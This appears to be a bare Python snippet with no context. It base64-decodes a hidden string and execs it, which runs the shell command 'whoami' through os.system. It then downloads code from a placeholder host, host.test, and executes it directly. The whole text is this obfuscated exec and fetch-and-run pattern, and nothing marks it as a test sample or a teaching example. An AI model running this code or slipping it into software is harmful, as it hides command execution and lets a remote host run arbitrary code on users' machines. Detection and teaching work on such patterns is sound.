import base64, urllib.request
blob = "aW1wb3J0IG9zO29zLnN5c3RlbSgnd2hvYW1pJyk="
exec(base64.b64decode(blob))
exec(urllib.request.urlopen("https://host.test/code").read())
